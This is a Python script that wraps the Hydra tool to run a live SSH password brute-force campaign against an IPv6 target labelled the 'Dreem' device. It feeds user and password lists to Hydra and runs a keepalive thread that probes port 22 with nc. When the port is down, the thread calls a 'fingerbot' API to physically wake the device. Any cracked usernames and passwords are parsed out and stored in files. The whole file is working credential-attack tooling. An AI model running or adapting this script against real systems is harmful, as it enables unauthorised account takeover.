#!/usr/bin/env python3
"""Run one live Hydra SSH phase against the Dreem IPv6 target.

The script keeps the target awake, writes a restricted run directory, and stores
any discovered password in hydra_success.secret without printing it.
"""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import json
import os
from pathlib import Path
import re
import signal
import subprocess
import sys
import threading
import time
import urllib.parse


TARGET_DEFAULT = "fd00::1"
FINGERBOT_BASE = os.environ.get("DREEM_FINGERBOT_BASE_URL", "")
FINGERBOT_LOGIN_JSON = Path(
    os.environ.get("DREEM_FINGERBOT_TOKEN_JSON", "private/fingerbot_login.raw.json")
)


def utc_stamp() -> str:
    return datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")


def utc_line() -> str:
    return datetime.now(timezone.utc).strftime("%a %b %d %H:%M:%S UTC %Y")


def load_fingerbot_token() -> str | None:
    try:
        return json.loads(FINGERBOT_LOGIN_JSON.read_text())["result"]["token"]
    except Exception:
        return None


def keepalive(run: Path, target: str, stop: threading.Event) -> None:
    token = load_fingerbot_token()
    keepalive_log = run / "keepalive.log"
    (run / "keepalive.pid").write_text(f"{os.getpid()}\n")
    while not stop.is_set():
        ok = (
            subprocess.run(
                ["nc", "-zvw3", target, "22"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            ).returncode
            == 0
        )
        with keepalive_log.open("a", encoding="utf-8") as fh:
            fh.write(f"{time.time():.0f} ssh_ok={int(ok)}\n")
        if not ok and token and FINGERBOT_BASE:
            url = FINGERBOT_BASE + "/api/fingerbot/click?" + urllib.parse.urlencode(
                {"auth_token": token, "press_time": "250", "angle_enum": "2"}
            )
            subprocess.run(
                [
                    "curl",
                    "-k",
                    "-sS",
                    "-m",
                    "20",
                    "-o",
                    str(run / "keepalive_last_click.json"),
                    url,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            stop.wait(15)
        else:
            stop.wait(30)


def read_text_if_exists(path: Path) -> str:
    if not path.exists():
        return ""
    return path.read_text(errors="replace")


def record_success(run: Path, phase: str, log_path: Path, out_path: Path) -> dict[str, object]:
    text = read_text_if_exists(log_path) + "\n" + read_text_if_exists(out_path)
    found: list[tuple[str, str]] = []
    for match in re.finditer(r"login:\s*(\S+)\s+password:\s*(.*)", text):
        user = match.group(1)
        password = match.group(2).strip()
        if user and password:
            found.append((user, password))

    if found:
        user, password = found[-1]
        (run / "hydra_success.user").write_text(user + "\n")
        secret_path = run / "hydra_success.secret"
        secret_path.write_text(password + "\n")
        secret_path.chmod(0o600)
        (run / "hydra_success.json").write_text(
            json.dumps({"user": user, "secret_file": str(secret_path)}, indent=2) + "\n"
        )
        return {"run": str(run), "phase": phase, "found": True, "user": user}

    progress_tail = [
        line
        for line in text.splitlines()
        if "[STATUS]" in line or "target completed" in line or "hydra_rc=" in line
    ][-10:]
    return {"run": str(run), "phase": phase, "found": False, "progress_tail": progress_tail}


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--phase", required=True)
    parser.add_argument("--passwords", type=Path, required=True)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--login")
    group.add_argument("--users", type=Path)
    parser.add_argument("--target", default=TARGET_DEFAULT)
    parser.add_argument("--tasks", type=int, default=6)
    parser.add_argument("--connect-wait", type=int, default=8)
    parser.add_argument("--restore-wait", type=int, default=5)
    parser.add_argument("--timeout-seconds", type=int, default=3000)
    parser.add_argument("--run-prefix", default="ssh_campaigns/live_ipv6_hydra")
    args = parser.parse_args()

    if not args.passwords.exists():
        print(f"missing password file: {args.passwords}", file=sys.stderr)
        return 2
    if args.users and not args.users.exists():
        print(f"missing users file: {args.users}", file=sys.stderr)
        return 2

    run = Path(f"{args.run_prefix}_{args.phase}_{utc_stamp()}").resolve()
    run.mkdir(parents=True, mode=0o700)
    run.chmod(0o700)
    Path("ssh_campaigns/latest_hydra_run.txt").write_text(str(run) + "\n")
    (run / "hydra_wrapper.pid").write_text(f"{os.getpid()}\n")

    log_path = run / f"hydra_{args.phase}.log"
    out_path = run / f"hydra_{args.phase}.out"
    stop = threading.Event()
    thread = threading.Thread(target=keepalive, args=(run, args.target, stop), daemon=True)
    thread.start()

    command = [
        "hydra",
        "-6",
        "-I",
        "-f",
    ]
    if args.login:
        command.extend(["-l", args.login])
    else:
        command.extend(["-L", str(args.users)])
    command.extend(
        [
            "-P",
            str(args.passwords),
            "-e",
            "nsr",
            "-s",
            "22",
            "-t",
            str(args.tasks),
            "-w",
            str(args.connect_wait),
            "-W",
            str(args.restore_wait),
            "-o",
            str(out_path),
            f"ssh://[{args.target}]",
        ]
    )

    rc = 124
    try:
        with log_path.open("w", encoding="utf-8") as log:
            log.write(utc_line() + "\n")
            log.write(f"phase={args.phase}\n")
            log.flush()
            proc = subprocess.Popen(
                command,
                stdout=log,
                stderr=subprocess.STDOUT,
                start_new_session=True,
            )
            try:
                rc = proc.wait(timeout=args.timeout_seconds)
            except subprocess.TimeoutExpired:
                os.killpg(proc.pid, signal.SIGTERM)
                try:
                    rc = proc.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    os.killpg(proc.pid, signal.SIGKILL)
                    proc.wait(timeout=10)
                    rc = 124
                else:
                    rc = 124
            log.write(f"hydra_rc={rc}\n")
            log.write(utc_line() + "\n")
    finally:
        stop.set()
        thread.join(timeout=10)
        (run / "STOP_KEEPALIVE").write_text("1\n")

    result = record_success(run, args.phase, log_path, out_path)
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result.get("found") else rc if rc not in (0, 1, 255) else 1


if __name__ == "__main__":
    raise SystemExit(main())
